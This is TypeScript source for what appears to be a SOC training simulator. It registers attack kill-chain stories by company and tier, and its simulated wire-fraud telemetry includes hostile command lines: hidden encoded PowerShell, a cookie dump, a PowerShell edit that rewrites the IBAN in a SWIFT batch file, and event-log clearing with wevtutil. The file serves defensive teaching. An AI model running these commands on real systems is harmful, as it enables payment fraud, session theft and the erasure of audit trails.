/**
 * Attack Story registry — the single source of truth for per-session attack narratives.
 *
 * Each story is a coherent, ordered kill-chain (10 events) built from the
 * scenario telemetry in src/lib/sim/scenarioEvents.ts and the packs'
 * *.events.ts modules. The dashboard picks ONE story per session (per company),
 * injects its events IN ORDER in small phases, and uses the story metadata
 * (title + MITRE techniques) as ground truth for the incident-report grader.
 *
 * This module is loaded IN THE BROWSER (simData.ts), so it must import only the
 * events-only halves, never the scenario builders (scenarios.ts or a pack's own
 * .ts): those carry the answer key, and whatever is imported here ships in a
 * public /_next/static chunk. clientAnswerKeyGuard.test.ts enforces this.
 *
 * Diversity guarantees:
 *  - Company fit: a story is only offered to companies whose SIEM architecture
 *    actually contains the story's log sources (K8s pod escape never appears
 *    at a hospital with no Kubernetes).
 *  - Anti-repeat memory: the last N picked story ids are remembered in
 *    localStorage so consecutive sessions always see different attacks.
 *  - Victim variation: ~50% of sessions swap the victim user for another
 *    employee from the company pool.
 */

import {
  phishingToExfilEvents, becScenarioEvents, ransomwareScenarioEvents, oauthScenarioEvents,
  insiderThreatScenarioEvents, impossibleTravelScenarioEvents, cloudKeyLeakS3ExfilScenarioEvents,
  dcSyncScenarioEvents, supplyChainScenarioEvents, mfaFatigueScenarioEvents,
  asRepRoastingScenarioEvents, ntlmRelayScenarioEvents, k8sPodEscapeScenarioEvents,
  oauthConsentPhishingScenarioEvents, kerberoastingScenarioEvents, dnsTunnelingScenarioEvents,
  lolBinsScenarioEvents, phishingMalwareScenarioEvents, usbMalwareScenarioEvents,
  browserExtensionMalwareScenarioEvents, techSupportScamScenarioEvents,
  crackedSoftwareScenarioEvents, maliciousMacroScenarioEvents,
} from "@/lib/sim/scenarioEvents";
// Expert scenario-packs — hand-authored, vendor-accurate kill-chains that until
// now only lived in the static /scenarios exercise and never surfaced in the
// LIVE dashboard feed. Wiring them here roughly doubles the attack variety a
// student can meet live. Each is company-restricted (below) to the estates whose
// telemetry actually carries it — ESXi/vCenter at on-prem datacenters, Linux
// auditd where there are Linux servers, AiTM/AD attacks at the M365/AD shops.
import { esxiRansomwareScenarioEvents }        from "@/lib/sim/scenario-packs/esxiRansomware.events";
import { lsReadJson, lsSet, isStringArray } from "@/lib/storage/safeStorage";
import { companyNetbios as companyNetbiosOf, makeCtx } from "@/lib/logs/native/ctx";
import { testNetIp } from "@/lib/logs/native/sources/remote-access-shared";
import { edrFacts, stashThread } from "@/lib/logs/native/sources/edr-normalize";
import { threadIdentityContext } from "@/lib/logs/native/sources/_identity-common";
import { threadEndpointStory } from "@/lib/logs/native/sources/_proc-identity";
import { rogueAdminAccountScenarioEvents }     from "@/lib/sim/scenario-packs/rogueAdminAccount.events";
import { impossibleTravelBasicScenarioEvents } from "@/lib/sim/scenario-packs/impossibleTravelBasic.events";
import { webShellRceScenarioEvents }           from "@/lib/sim/scenario-packs/webShellRce.events";
import { linuxSshPersistenceScenarioEvents }   from "@/lib/sim/scenario-packs/linuxSshPersistence.events";
import { aitmTokenTheftScenarioEvents }        from "@/lib/sim/scenario-packs/aitmTokenTheft.events";
import { bruteForceSingleAccountScenarioEvents } from "@/lib/sim/scenario-packs/bruteForceSingleAccount.events";
// Foundation-tier additions. Before these, the easy tier held 7 stories, and
// after company-fit filtering the two Okta-only estates (rocketstack,
// quantumbank) saw just 4 — smaller than RECENT_N below, so the anti-repeat
// filter emptied and easy-mode students met a repeat by their fifth session.
// Three of the five are deliberately source-light (edr + firewall only) so they
// fit every estate; the Okta and Google Workspace packs exist specifically to
// give the two non-Microsoft companies an identity and an email scenario.
import { oktaPasswordBurstScenarioEvents }        from "@/lib/sim/scenario-packs/oktaPasswordBurst.events";
import { fakeBrowserUpdateScenarioEvents }        from "@/lib/sim/scenario-packs/fakeBrowserUpdate.events";
import { trojanizedInstallerKeyloggerScenarioEvents } from "@/lib/sim/scenario-packs/trojanizedInstallerKeylogger.events";
import { gwsPhishingAttachmentScenarioEvents }    from "@/lib/sim/scenario-packs/gwsPhishingAttachment.events";
import { bundledCryptominerScenarioEvents }       from "@/lib/sim/scenario-packs/bundledCryptominer.events";
// Second foundation batch (six more source-light edr+firewall packs). Even after
// the first batch, the easy pool per company sat right at RECENT_N=8, so a
// student who played daily could still meet a repeat within a working week.
// These six lift every company's foundation pool clear of the anti-repeat window
// and add genuinely different initial-access tradecraft (SEO-poisoned installer,
// ISO/MotW smuggling, drive-by miner, ClickFix fake-CAPTCHA, clipboard clipper,
// scheduled-task persistence) so consecutive easy sessions feel distinct.
import { seoPoisonedInstallerScenarioEvents }     from "@/lib/sim/scenario-packs/seoPoisonedInstaller.events";
import { isoContainerSmugglingScenarioEvents }    from "@/lib/sim/scenario-packs/isoContainerSmuggling.events";
import { driveByBrowserMinerScenarioEvents }      from "@/lib/sim/scenario-packs/driveByBrowserMiner.events";
import { clickFixFakeCaptchaScenarioEvents }      from "@/lib/sim/scenario-packs/clickFixFakeCaptcha.events";
import { clipboardClipperScenarioEvents }         from "@/lib/sim/scenario-packs/clipboardClipper.events";
import { scheduledTaskPersistenceScenarioEvents } from "@/lib/sim/scenario-packs/scheduledTaskPersistence.events";
// P0 attack-coverage additions (docs/live-feed-attack-coverage-review.md). These
// close the biggest gaps DBIR/CISA flag versus what the feed taught: infostealer
// cookie theft + session replay (the #1 real credential source), edge-appliance
// pre-auth exploitation (dominant ransomware entry), exfil-only "no-encryptor"
// extortion (modern double-extortion reality), and help-desk MFA-reset account
// takeover (Scattered Spider). They also lift the thin core/advanced pools clear
// of the RECENT_N=8 anti-repeat window for the M365/Okta estates.
import { infostealerSessionTheftScenarioEvents }  from "@/lib/sim/scenario-packs/infostealerSessionTheft.events";
import { edgeVpnCveExploitScenarioEvents }        from "@/lib/sim/scenario-packs/edgeVpnCveExploit.events";
import { exfilFirstExtortionScenarioEvents }      from "@/lib/sim/scenario-packs/exfilFirstExtortion.events";
import { helpdeskMfaResetScenarioEvents }         from "@/lib/sim/scenario-packs/helpdeskMfaReset.events";
import { COMPANY_ATTACKS, ROCKETSTACK_CRED_STUFFING_CHAIN } from "@/lib/sim/companyProfiles";
import { COMPANY_PROFILES, COMPANY_ASSETS } from "@/lib/sim/companyProfilesMeta";
import { AI_CORE_STORIES } from "./ai-stories/core";
import { AI_EXTRA_STORIES } from "./ai-stories/extra";
import { AI_WAVE2_STORIES } from "./ai-stories/wave2";
import { AI_FOUNDATION_STORIES } from "./ai-stories/foundation";
import { AI_ADVANCED_A_STORIES } from "./ai-stories/advanced-a";
import { aiLlmJackingScenarioEvents } from "@/lib/sim/scenario-packs/aiLlmJacking.events";
import type { TelemetryEvent } from "@/lib/sim/types";
import { ecsTechnique } from "@/lib/logs/ecsFields";

/**
 * Real difficulty for STORY SELECTION — how simple the attack itself is for a
 * student who is brand-new to SOC work, not how "advanced" the technique
 * sounds. This is independent of scenarios.ts's own `difficulty` field, which
 * grades attacker sophistication and was found (2026-07-03 alignment audit)
 * to mislabel several multi-stage identity attacks as "beginner."
 *  - foundation: one host, one user, no lateral movement, no credential
 *    theft, no cloud pivot. Safe as literally the first attack ever seen.
 *  - core: contained to one system/domain but multi-stage, or requires
 *    reading more than one log source together.
 *  - advanced: full kill chain — lateral movement, credential theft, cloud
 *    pivot, or multi-host/multi-domain reasoning.
 */
export type StoryComplexity = "foundation" | "core" | "advanced";

export interface AttackStory {
  id: string;
  title: string;
  events: TelemetryEvent[];
  /** Unique MITRE technique ids across the story's events — report ground truth */
  mitre: string[];
  /** Explicit company allowlist. Omitted = decided by the source-fit rule. */
  companies?: string[];
  complexity: StoryComplexity;
}

// ── Scenario bundles (instantiated once at module load) ───────────────────────

const _phishing         = phishingToExfilEvents();
const _bec              = becScenarioEvents();
const _ransomware       = ransomwareScenarioEvents();
const _oauth            = oauthScenarioEvents();
const _insider          = insiderThreatScenarioEvents();
const _impossibleTravel = impossibleTravelScenarioEvents();
const _awsKeyLeak       = cloudKeyLeakS3ExfilScenarioEvents();
const _dcsync           = dcSyncScenarioEvents();
const _supplyChain      = supplyChainScenarioEvents();
const _mfaFatigue       = mfaFatigueScenarioEvents();
const _asrepRoasting    = asRepRoastingScenarioEvents();
const _ntlmRelay        = ntlmRelayScenarioEvents();
const _k8sPodEscape     = k8sPodEscapeScenarioEvents();
const _oauthConsent     = oauthConsentPhishingScenarioEvents();
const _kerberoasting    = kerberoastingScenarioEvents();
const _dnsTunneling     = dnsTunnelingScenarioEvents();
const _lolbins          = lolBinsScenarioEvents();
const _phishingMalware  = phishingMalwareScenarioEvents();
const _usbMalware       = usbMalwareScenarioEvents();
const _browserExtension = browserExtensionMalwareScenarioEvents();
const _techSupportScam  = techSupportScamScenarioEvents();
const _crackedSoftware  = crackedSoftwareScenarioEvents();
const _maliciousMacro   = maliciousMacroScenarioEvents();

// Expert scenario-packs (see import note above)
const _esxiRansomware   = esxiRansomwareScenarioEvents();
const _rogueAdmin       = rogueAdminAccountScenarioEvents();
const _impossibleTravelBasic = impossibleTravelBasicScenarioEvents();
const _webShellRce      = webShellRceScenarioEvents();
const _linuxSshPersistence = linuxSshPersistenceScenarioEvents();
const _aitmTokenTheft   = aitmTokenTheftScenarioEvents();
const _bruteForceSingle = bruteForceSingleAccountScenarioEvents();
const _oktaPasswordBurst    = oktaPasswordBurstScenarioEvents();
const _fakeBrowserUpdate    = fakeBrowserUpdateScenarioEvents();
const _trojanizedKeylogger  = trojanizedInstallerKeyloggerScenarioEvents();
const _gwsPhishAttachment   = gwsPhishingAttachmentScenarioEvents();
const _bundledCryptominer   = bundledCryptominerScenarioEvents();
const _seoPoisonedInstaller    = seoPoisonedInstallerScenarioEvents();
const _isoContainerSmuggling   = isoContainerSmugglingScenarioEvents();
const _driveByBrowserMiner     = driveByBrowserMinerScenarioEvents();
const _clickFixFakeCaptcha     = clickFixFakeCaptchaScenarioEvents();
const _clipboardClipper        = clipboardClipperScenarioEvents();
const _scheduledTaskPersistence = scheduledTaskPersistenceScenarioEvents();
// P0 additions (see import note above)
const _infostealerSessionTheft = infostealerSessionTheftScenarioEvents();
const _edgeVpnCveExploit        = edgeVpnCveExploitScenarioEvents();
const _exfilFirstExtortion      = exfilFirstExtortionScenarioEvents();
const _helpdeskMfaReset         = helpdeskMfaResetScenarioEvents();

const deriveMitre = (events: TelemetryEvent[]): string[] =>
  Array.from(new Set(events.map(e => e.mitre_technique).filter(Boolean))) as string[];

const story = (
  id: string,
  bundle: { title: string; events: TelemetryEvent[] },
  complexity: StoryComplexity,
  companies?: string[],
): AttackStory => ({
  id,
  title: bundle.title,
  // Stamp each event with the story's tier so enrichEvent can scale log fidelity
  // (clean for foundation, production-grade noise for advanced).
  events: bundle.events.map(e => ({ ...e, tier: e.tier ?? complexity })),
  mitre: deriveMitre(bundle.events),
  complexity,
  ...(companies ? { companies } : {}),
});

const GENERIC_STORIES: AttackStory[] = [
  // ── foundation: one host, one user, no lateral movement — safe as a first attack ──
  story("phishing-malware",     _phishingMalware,     "foundation"),
  story("usb-malware",          _usbMalware,          "foundation"),
  story("browser-extension",    _browserExtension,    "foundation"),
  story("tech-support-scam",    _techSupportScam,     "foundation"),
  story("cracked-software",     _crackedSoftware,     "foundation"),
  story("malicious-macro",      _maliciousMacro,      "foundation"),

  // ── core: contained but multi-stage, or needs more than one log source read together ──
  story("insider",          _insider,          "core"),
  story("impossible-travel", _impossibleTravel, "core"),

  // ── advanced: full kill chain — lateral movement, credential theft, cloud pivot, or
  // multi-account/multi-domain reasoning. Mislabeled "beginner" by scenarios.ts's own
  // difficulty field for bec/mfa-fatigue (attacker-sophistication axis, not
  // student-readiness) — reclassified here per the 2026-07-03 alignment audit.
  story("phishing",          _phishing,        "advanced"),
  story("bec",               _bec,             "advanced"),
  story("ransomware",        _ransomware,      "advanced"),
  story("oauth",             _oauth,           "advanced"),
  // AWS-native (GitHub secret leak → S3 exfil) — rocketstack is the cloud-native
  // estate whose identities these carry; keeps the feed tenant-pure.
  story("aws-key-leak-s3-exfil", _awsKeyLeak,   "advanced", ["rocketstack"]),
  story("dcsync",            _dcsync,          "advanced"),
  story("supply-chain",      _supplyChain,     "advanced", ["rocketstack"]),
  story("mfa-fatigue",       _mfaFatigue,      "advanced"),
  story("asrep-roasting",    _asrepRoasting,   "advanced"),
  story("ntlm-relay",        _ntlmRelay,       "advanced"),
  // Kubernetes attack only makes sense at the cloud-native SaaS company
  story("k8s-pod-escape",    _k8sPodEscape,    "advanced", ["rocketstack"]),
  story("oauth-consent",     _oauthConsent,    "advanced"),
  story("kerberoasting",     _kerberoasting,   "advanced"),
  story("dns-tunneling",     _dnsTunneling,    "advanced"),
  story("lolbins",           _lolbins,         "advanced"),

  // ── Expert scenario-packs, now live in the dashboard feed ──────────────────
  // Company-restricted to the estates whose telemetry actually carries the
  // attack (these packs use windows_security / linux_audit / waf / db_monitor /
  // email_gateway sources that the source-fit heuristic can't map, so an
  // explicit allowlist is required — same mechanism as k8s-pod-escape).

  // Single-account brute force, visible entirely in Windows auth logs — one
  // user, one source, no lateral movement: a genuine foundation-tier attack
  // that finally gives the Easy tier an identity scenario (was malware-only).
  story("bruteforce-single", _bruteForceSingle,      "foundation", ["nexacorp", "medcore", "globallogis"]),

  // The same lesson for estates with no Active Directory — the whole attack
  // lives in the Okta System Log. Deliberately ends in FAILURE at the second
  // factor: the password is compromised even though nobody got in.
  story("okta-password-burst", _oktaPasswordBurst,   "foundation", ["rocketstack", "quantumbank"]),

  // Google Workspace email-borne foundation story. rocketstack is the only
  // estate that ships gws telemetry, and until now it had no email scenario at
  // the easy tier at all.
  story("gws-phish-attachment", _gwsPhishAttachment, "foundation", ["rocketstack"]),

  // Source-light on purpose (edr + firewall), so every company can draw them.
  story("fake-browser-update", _fakeBrowserUpdate,   "foundation"),
  story("trojanized-keylogger", _trojanizedKeylogger, "foundation"),
  story("bundled-cryptominer", _bundledCryptominer,  "foundation"),
  // Second foundation batch — source-light (edr+firewall), fits every company.
  story("seo-poisoned-installer",  _seoPoisonedInstaller,    "foundation"),
  story("iso-container-smuggling", _isoContainerSmuggling,   "foundation"),
  story("drive-by-browser-miner",  _driveByBrowserMiner,     "foundation"),
  story("clickfix-fake-captcha",   _clickFixFakeCaptcha,     "foundation"),
  story("clipboard-clipper",       _clipboardClipper,        "foundation"),
  story("scheduled-task-persistence", _scheduledTaskPersistence, "foundation"),

  // core — contained identity/AD attacks that need correlating a few events
  story("impossible-travel-basic", _impossibleTravelBasic, "core", ["nexacorp", "medcore", "globallogis", "rocketstack", "quantumbank"]),
  story("rogue-admin",       _rogueAdmin,            "core", ["nexacorp", "medcore", "globallogis"]),

  // advanced — full kill chains on infrastructure the on-prem/cloud estates run
  story("esxi-ransomware",   _esxiRansomware,        "advanced", ["medcore", "globallogis", "nexacorp"]),
  story("webshell-rce",      _webShellRce,           "advanced", ["rocketstack", "quantumbank", "nexacorp"]),
  story("linux-ssh-persistence", _linuxSshPersistence, "advanced", ["globallogis", "rocketstack"]),
  story("aitm-token-theft",  _aitmTokenTheft,        "advanced", ["nexacorp", "medcore", "globallogis"]),

  // ── P0 attack-coverage additions (docs/live-feed-attack-coverage-review.md) ──
  // Grouped by tier. All four are Entra/M365-native except edge-vpn, which is a
  // source-light appliance→internal-host chain that fits every estate.

  // core — infostealer cookie theft then session replay bypassing MFA (the #1
  // real-world credential source). Needs Entra sign-in logs to show the replay,
  // so it is offered to the three M365 estates only.
  story("infostealer-session-theft", _infostealerSessionTheft, "core", ["nexacorp", "medcore", "globallogis"]),

  // core — help-desk social engineering → MFA reset → new-device logon
  // (Scattered Spider). ServiceNow ticket + Entra auth/audit, M365 estates only.
  story("helpdesk-mfa-reset", _helpdeskMfaReset,     "core", ["nexacorp", "medcore", "globallogis"]),

  // advanced — pre-auth exploitation of an internet-facing SSL-VPN appliance as
  // initial access, then a pivot to an internal Windows host. Source-light
  // (firewall/vpn + edr + siem), so every company can draw it.
  story("edge-vpn-cve-exploit", _edgeVpnCveExploit,  "advanced"),

  // advanced — exfil-only "no-encryptor" double extortion: mass staging →
  // archive → cloud egress with T1486 deliberately absent. Needs a DLP surface
  // (Purview), so it is offered to the three M365 estates.
  story("exfil-first-extortion", _exfilFirstExtortion, "advanced", ["nexacorp", "medcore", "globallogis"]),
];

// ── Company-specific chains ────────────────────────────────────────────────────
// COMPANY_ATTACKS holds 4 hand-authored, vendor-accurate kill-chains per company
// (16 events each = 4 chains x 4 events), written specifically against that
// company's real security stack. These were orphaned by the old attack-pool
// mechanism and are now promoted into proper AttackStory entries so every
// company gets meaningfully more story variety instead of leaning on the
// generic cross-company pool above.
const CHAIN_TITLES: Record<string, string[]> = {
  nexacorp: [
    "Phishing → Inbox Rule → Key Vault Secrets Exfil",
    "CEO Account Takeover — Business Email Compromise",
    "Insider Data Theft — Deal Models to Personal Email",
    "AD Password Spray from TOR Exit Node",
  ],
  medcore: [
    "Ransomware — Phishing DOCM to EMR Encryption",
    "Insider Data Theft — Patient Records via USB",
    "VPN Compromise → PACS Medical Imaging Exfil",
    "Cisco VPN Brute Force → Clinical Account Compromise",
  ],
  globallogis: [
    "Finance Phishing → WMS Server Compromise → FTP Exfil",
    "Warehouse Terminal Malware → ERP Lateral Movement",
    "Disgruntled Employee — Bulk Customer Database Theft",
    "SSH Brute Force → Linux Server Root Compromise",
  ],
  rocketstack: [
    "Compromised Okta (TOR) → S3 Customer Database Exfil",
    "Malicious npm Package → Reverse Shell on Dev Workstation",
    "Container Escape → Crypto Mining + Prod Secrets",
    "Okta Credential Stuffing → AWS Console Compromise",
  ],
  quantumbank: [
    "MFA Fatigue → Cobalt Strike → Core Banking Session Takeover",
    "CyberArk Vault Abuse — Unauthorized Privilege Escalation",
    "Rogue Trading — Market Manipulation via Authorized Account",
    "SWIFT Password Spray → Core Banking Session Hijack",
  ],
};

/**
 * A company's kill chains, by the chain letter in the event id (nx_a1… → chain a, qb_d3 → chain d),
 * so a chain can carry as many steps as its investigation needs. Ids without a letter fall back
 * to the old fixed slices of four.
 */
function chunk4(events: TelemetryEvent[]): TelemetryEvent[][] {
  const byLetter = new Map<string, TelemetryEvent[]>();
  const loose: TelemetryEvent[] = [];
  for (const e of events) {
    const m = /_([a-z])\d+[a-z]?$/.exec(String(e.id ?? ""));
    if (m) (byLetter.get(m[1]) ?? byLetter.set(m[1], []).get(m[1])!).push(e); else loose.push(e);
  }
  if (loose.length === 0 && byLetter.size > 0) return [...byLetter.keys()].sort().map(k => byLetter.get(k)!);
  const out: TelemetryEvent[][] = [];
  for (let i = 0; i < events.length; i += 4) out.push(events.slice(i, i + 4));
  return out;
}

// These are 4-event slices carved out of larger 16-event company kill chains
// (see chunk4 above) — not individually verified for beginner-friendliness,
// so they default to "core" rather than being assumed simple. They still
// give Medium/Hard sessions company-flavored variety beyond the generic pool.
//
// Exception: a few chain-D slices end in host-to-host lateral movement or a
// root/privilege compromise (medcore-chain-d = VPN brute -> RDP lateral;
// globallogis-chain-d = SSH brute -> root -> dropper). Those meet the "advanced"
// bar, so a Medium session (foundation+core only) must NOT be served them —
// they are promoted to "advanced" and surface at Hard, where they also add
// company-specific variety to the otherwise generic advanced pool.
const ADVANCED_CHAIN_SLICES = new Set(["medcore-chain-d", "globallogis-chain-d"]);
const COMPANY_CHAIN_STORIES: AttackStory[] = Object.entries(COMPANY_ATTACKS).flatMap(
  ([companyId, events]) => {
    const titles = CHAIN_TITLES[companyId] ?? [];
    return chunk4(events).map((chainEvents, i) => {
      const id = `${companyId}-chain-${String.fromCharCode(97 + i)}`;
      return story(id,
        { title: titles[i] ?? `${companyId} — Chain ${String.fromCharCode(65 + i)}`, events: chainEvents },
        ADVANCED_CHAIN_SLICES.has(id) ? "advanced" : "core",
        [companyId]);
    });
  }
);

const ROCKETSTACK_CRED_STUFFING_STORY = story(
  "rocketstack-cred-stuffing",
  { title: "Credential Stuffing → Device Persistence → AWS/GitHub Theft", events: ROCKETSTACK_CRED_STUFFING_CHAIN },
  "advanced",
  ["rocketstack"]
);

// ── Hard-tier content-gap fill (2026-09 content audit) ─────────────────────────
// QuantumBank had only 4 advanced-fit stories before this batch, RocketStack 8 —
// both under/at the RECENT_N=8 anti-repeat window, so a Hard-difficulty class at
// either estate saw the same handful of incidents on repeat. Three hand-authored
// banking/fraud kill-chains for QuantumBank (SWIFT wire-fraud, fraud-monitoring
// tampering, CyberArk PAM abuse -> money-mule payout) and three cloud/devops
// kill-chains for RocketStack (CI/CD pipeline poisoning, Terraform IaC backdoor,
// SaaS OAuth consent-chaining). Each is explicitly company-restricted (same
// mechanism as k8s-pod-escape / esxi-ransomware above) so it bypasses the
// source-fit heuristic and is never offered to a company whose SIEM doesn't
// carry that vendor. Every raw field uses only that vendor's real schema
// (CyberArk PAM, Okta, AWS CloudTrail/GuardDuty, Zscaler ZIA, Palo Alto NGFW,
// CrowdStrike Falcon, GitHub Audit Log, Google Workspace, FortiGate).

// ── QuantumBank Chain E — SWIFT wire-fraud via vendor payment redirect ─────────
const QB_SWIFT_WIRE_FRAUD: TelemetryEvent[] = [
  {
    id: "qbwf1", ts: "2026-06-15T07:50:00.000Z", source: "edr", event_type: "process_create",
    severity: "medium", vendor: "CrowdStrike Falcon Elite", hostname: "WKS-QB-055", user_email: "p.meier@quantumbank.ch", src_ip: "10.100.1.55",
    description: "WINWORD.EXE on WKS-QB-055 spawned a hidden, encoded PowerShell command after p.meier opened Treasury_Counterparty_Update.xlsm",
    mitre_technique: "T1204.002", mitre_tactic: "Execution",
    process: { name: "powershell.exe", pid: 4471, parent_name: "WINWORD.EXE", parent_pid: 3391, user: "p.meier",
               cmdline: "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand JABXAGUAYgBDAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==",
               hash: { sha256: "8e403075db91e11c687fdffe710359d0e04e989f53ac9ac8d005d08130cc23c2" } },
    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand JABXAGUAYgBDAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==", "crowdstrike.FileName": "powershell.exe", "crowdstrike.FilePath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\", "crowdstrike.ParentBaseFileName": "WINWORD.EXE", "crowdstrike.UserName": "p.meier", "crowdstrike.SeverityName": "MEDIUM", "action_result": "allowed" }
  },
  {
    id: "qbwf2", ts: "2026-06-15T07:52:00.000Z", source: "firewall", event_type: "net_connection",
    severity: "high", vendor: "Palo Alto Networks NGFW", src_ip: "10.100.1.55", dst_ip: "194.36.189.20", dst_port: 443,
    description: "The PowerShell process on WKS-QB-055 pulled a second-stage payload over HTTPS from 194.36.189.20",
    mitre_technique: "T1105", mitre_tactic: "Command and Control",
    raw: { "pan.action": "allow", "pan.app": "ssl", "pan.rule": "ALLOW-OUTBOUND-HTTPS", "destination.ip": "194.36.189.20", "destination.port": "443", "source.ip": "10.100.1.55", "network.protocol": "tcp", "action_result": "allowed" }
  },
  {
    id: "qbwf3", ts: "2026-06-15T07:55:00.000Z", source: "edr", event_type: "process_create",
    severity: "high", vendor: "CrowdStrike Falcon Elite", hostname: "WKS-QB-055", user_email: "p.meier@quantumbank.ch", src_ip: "10.100.1.55",
    description: "The downloaded second stage ran as chrome_update.exe on WKS-QB-055 and dumped p.meier's browser-stored Okta session cookie",
    mitre_technique: "T1539", mitre_tactic: "Credential Access",
    process: { name: "chrome_update.exe", pid: 5560, parent_name: "powershell.exe", parent_pid: 4471, user: "p.meier",
               path: "C:\\Users\\p.meier\\AppData\\Local\\Temp\\chrome_update.exe",
               cmdline: "chrome_update.exe --dump-cookies --target=okta.quantumbank.ch",
               hash: { sha256: "a49ceab6f3029571559ee60319170fe21e15db8e866114bc7f67b04031a32d6b" } },
    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "chrome_update.exe --dump-cookies --target=okta.quantumbank.ch", "crowdstrike.FileName": "chrome_update.exe", "crowdstrike.FilePath": "C:\\Users\\p.meier\\AppData\\Local\\Temp\\", "crowdstrike.ParentBaseFileName": "powershell.exe", "crowdstrike.UserName": "p.meier", "crowdstrike.SeverityName": "HIGH", "action_result": "allowed" }
  },
  {
    id: "qbwf4", ts: "2026-06-15T08:04:00.000Z", source: "okta", event_type: "auth_success",
    severity: "critical", vendor: "Okta", user_email: "p.meier@quantumbank.ch", src_ip: "185.220.101.77",
    description: "A new Okta session for p.meier was established from 185.220.101.77 using the stolen browser session cookie — no fresh password or MFA prompt",
    mitre_technique: "T1550.004", mitre_tactic: "Lateral Movement",
    raw: { "okta.eventType": "user.session.start", "okta.outcome.result": "SUCCESS", "okta.debugContext.debugData.riskLevel": "CRITICAL", "okta.debugContext.debugData.behaviors": "New Device=POSITIVE, New IP=POSITIVE", "okta.client.ipAddress": "185.220.101.77", "action_result": "allowed" }
  },
  {
    id: "qbwf5", ts: "2026-06-15T08:09:00.000Z", source: "iam", event_type: "privileged_operation",
    severity: "high", vendor: "CyberArk PAM", user_email: "p.meier@quantumbank.ch", src_ip: "185.220.101.77",
    description: "Using the hijacked Okta session, p.meier's identity checked out svc-swift-app from the SWIFT-Operations vault with no change ticket attached",
    mitre_technique: "T1078.002", mitre_tactic: "Privilege Escalation",
    raw: { "pam.vault.name": "SWIFT-Operations", "pam.account.name": "svc-swift-app@corebanking-app01", "pam.checkout.status": "approved", "access.request.status": "not_required", "cyberark.ticket.required": "true", "cyberark.ticket.provided": "false", "cyberark.session.recorded": "true", "event.action": "credential-checkout", "event.outcome": "success", "user.email": "p.meier@quantumbank.ch", "action_result": "allowed" }
  },
  {
    id: "qbwf6", ts: "2026-06-15T08:14:00.000Z", source: "edr", event_type: "process_create",
    severity: "critical", vendor: "CrowdStrike Falcon Elite", hostname: "SRV-QB-ADMIN01", user_email: "svc-swift-app@quantumbank.ch", src_ip: "10.100.1.10",
    description: "Running as svc-swift-app on SRV-QB-ADMIN01, a PowerShell command rewrote the beneficiary IBAN inside the day's outbound SWIFT payment batch file",
    mitre_technique: "T1565.001", mitre_tactic: "Impact",
    process: { name: "powershell.exe", pid: 7711, parent_name: "cmd.exe", parent_pid: 7700, user: "svc-swift-app",
               cmdline: "powershell.exe -Command \"(Get-Content C:\\SWIFT\\Outbound\\PaymentBatch_20260615.xml) -replace 'BENEFICIARY_IBAN','LT121000011101001000' | Set-Content C:\\SWIFT\\Outbound\\PaymentBatch_20260615.xml\"" },
    raw: { "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.CommandLine": "powershell.exe -Command \"(Get-Content C:\\SWIFT\\Outbound\\PaymentBatch_20260615.xml) -replace 'BENEFICIARY_IBAN','LT121000011101001000' | Set-Content C:\\SWIFT\\Outbound\\PaymentBatch_20260615.xml\"", "crowdstrike.FileName": "powershell.exe", "crowdstrike.ParentBaseFileName": "cmd.exe", "crowdstrike.UserName": "svc-swift-app", "crowdstrike.SeverityName": "CRITICAL", "action_result": "allowed" }
  },
  {
    id: "qbwf7", ts: "2026-06-15T08:20:00.000Z", source: "proxy", event_type: "http_request",
    severity: "critical", vendor: "Zscaler Internet Access", src_ip: "10.100.1.10",
    description: "A POST to the core-banking SWIFT transfer API submitted a CHF 4.85 million wire to the tampered beneficiary IBAN",
    mitre_technique: "T1657", mitre_tactic: "Impact",
    raw: { "event.action": "http-request", "http.request.method": "POST", "url.domain": "corebanking.quantumbank.ch", "url.path": "/swift/api/v3/transfers", "url.query": "amount_chf=4850000&beneficiary_iban=LT121000011101001000&reference=FX-2026-88231", "event.outcome": "success", "source.ip": "10.100.1.10", "action_result": "allowed" }
  },
  {
    id: "qbwf8", ts: "2026-06-15T08:27:00.000Z", source: "iam", event_type: "privileged_operation",
    severity: "high", vendor: "CyberArk PAM", src_ip: "10.100.1.10",
    description: "svc-swift-app was checked back in to the vault, but the mandatory PSM session recording for the checkout is missing",
    mitre_technique: "T1070", mitre_tactic: "Stealth",
    raw: { "pam.vault.name": "SWIFT-Operations", "pam.account.name": "svc-swift-app@corebanking-app01", "pam.checkout.status": "returned", "session.state": "recording_missing", "cyberark.session.recorded": "false", "event.action": "session-checkin", "event.outcome": "anomalous", "action_result": "allowed" }
  },
  {
    id: "qbwf9", ts: "2026-06-15T08:33:00.000Z", source: "edr", event_type: "process_create",
    severity: "critical", vendor: "CrowdStrike Falcon Elite", hostname: "SRV-QB-ADMIN01", user_email: "svc-swift-app@quantumbank.ch", src_ip: "10.100.1.10",
    is_detection: true,
    description: "wevtutil.exe cl Security ran as svc-swift-app on SRV-QB-ADMIN01 to clear the logon trail; CrowdStrike terminated the process",
    mitre_technique: "T1685.005", mitre_tactic: "Defense Impairment",
    process: { name: "wevtutil.exe", pid: 7810, parent_name: "cmd.exe", parent_pid: 7700, user: "svc-swift-app", cmdline: "wevtutil.exe cl Security" },
    raw: { "crowdstrike.event_simpleName": "DetectionSummaryEvent", "crowdstrike.Technique": "Clear Windows Event Logs", "crowdstrike.Tactic": "Defense Impairment", "crowdstrike.SeverityName": "CRITICAL", "crowdstrike.PatternDispositionDescription": "Process Terminated", "action_result": "process_killed" }
  },
  {
    id: "qbwf10", ts: "2026-06-15T08:37:00.000Z", source: "firewall", event_type: "net_connection",
    severity: "high", vendor: "Palo Alto Networks NGFW", src_ip: "10.100.1.10", dst_ip: "194.36.189.20", dst_port: 443,
    description: "A follow-up beacon from SRV-QB-ADMIN01 to 194.36.189.20 was blocked once threat intel tagged the IP as wire-fraud C2",
    mitre_technique: "T1071.001", mitre_tactic: "Command and Control",
